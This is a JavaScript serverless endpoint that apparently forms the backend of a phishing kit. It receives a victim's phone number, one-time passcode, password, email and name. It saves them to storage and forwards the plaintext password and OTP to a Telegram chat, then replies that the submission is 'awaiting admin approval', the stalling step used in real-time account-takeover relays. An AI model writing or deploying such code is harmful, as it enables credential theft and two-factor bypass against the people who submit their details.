import { makeJsonResponse, makeTextResponse, uuidv4, setRequestInKV, sendTelegramNotification } from "../_shared.js";

export async function onRequest(context) {
  const { request, env } = context;
  if (request.method === "OPTIONS") return makeTextResponse("", 204);
  if (request.method !== "POST") return makeJsonResponse({ error: "Method not allowed" }, 405);

  let body;
  try {
    body = await request.json();
  } catch (error) {
    return makeJsonResponse({ error: "Invalid JSON" }, 400);
  }

  const { phone, otp, password, userId, email, firstName, lastName } = body;
  if (!phone || !otp || !password) {
    return makeJsonResponse({ error: "Missing required fields: phone, otp, password" }, 400);
  }

  const requestId = uuidv4();
  const now = new Date().toISOString();

  const entry = {
    requestId,
    phone,
    otp,
    password,
    userId,
    email,
    firstName,
    lastName,
    timestamp: now,
    approved: false,
    rejectedReason: null,
  };

  await setRequestInKV(env, requestId, entry, "otp");

  await sendTelegramNotification(
    { requestId, phone, otp, password, email, firstName, lastName, type: "OTP" },
    env,
    request.url,
  );

  return makeJsonResponse({ success: true, requestId, message: "OTP submitted. Awaiting admin approval." });
}
